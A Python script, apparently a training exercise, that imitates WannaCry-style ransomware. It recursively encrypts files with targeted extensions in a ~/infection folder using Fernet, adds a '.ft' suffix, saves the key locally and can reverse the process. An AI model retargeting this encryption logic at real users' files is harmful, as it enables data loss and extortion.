import argparse
import os
import pathlib
from cryptography.fernet import Fernet

VERSION = '1.0.0'
EXTESNIONS = open("wannacry_extension.txt", 'r').read().splitlines()

def decrypt(key, file, args):
    try:
        fernet = Fernet(key)
        with open(file, 'rb') as f:
            plaintext = f.read()
        ciphertext = fernet.decrypt(plaintext)
        with open(file , 'wb') as f:
            f.write(ciphertext)
            new = '.'.join(file.split('.')[:-1])
            if args.s is False:
                print(f'{file} was decrypted')
            os.rename(file, new)
    except Exception as e:
        print(f'{file}: {e}')

def decrypt_files(key, dir,args):
    for file in os.listdir(dir):
        file_path = os.path.join(dir, file)
        if os.path.isdir(file_path):
            decrypt_files(key, file_path, args)
        else:
            if file.split('.')[-1] == 'ft':
                decrypt(key, file_path, args)

def encrypt(key, file, args):
    try:
        fernet = Fernet(key)
        with open(file, 'rb') as f:
            plaintext = f.read()
        ciphertext = fernet.encrypt(plaintext)
        with open(file , 'wb') as f:
            f.write(ciphertext)
            new = f'{file}.ft'
            if args.s is False:
                print(f'{file} was ecnrypted')
            os.rename(file, new)
    except Exception as e:
        print(f'{file}: {e}')

def encrypt_files(key, dir, args):
    for file in os.listdir(dir):
        file_path = os.path.join(dir,file)
        if os.path.isdir(file_path):
            encrypt_files(key, file_path, args)
        else:
            ext = file_path.split('.')[-1]
            if ext in EXTESNIONS:
                encrypt(key, file_path, args)
            elif ext == 'ft':
                print(f'{file_path} is allready encrypted, skipping...')
                continue

def main():
    parser = argparse.ArgumentParser(description="Encrypt/decrypt file types infected by wannacry virus")
    parser.add_argument('-v', action='store_true', default=False, help='Display version of the program')
    parser.add_argument('-r',type=pathlib.Path, default=None, help='Reverse the infection using the generated key')
    parser.add_argument('-s', action='store_true', default=False, help='No output for encryption')
    args = parser.parse_args()

    if args.v is not False:
        print(f'Version: {VERSION}')
    home_path = os.path.expanduser('~')
    infec_dir = os.path.join(home_path, 'infection')
    if args.r is not None:
        if os.path.exists(args.r):
            key = open(args.r ,'rb').read()
            decrypt_files(key, infec_dir ,args)
        else:
            parser.error('Key path not available')
        print('Decrytion done')
    else:
        key_path = os.path.join(os.getcwd(), 'key')
        if not os.path.exists(key_path):
            key = Fernet.generate_key()
            with open(key_path, 'wb') as file:
                file.write(key)
        else:
            print('Key file allready exists, using the generated key')
            key = open(key_path, 'rb').read()
        encrypt_files(key, infec_dir, args)
        print('Encrytion done')

if __name__ == "__main__":
    main()
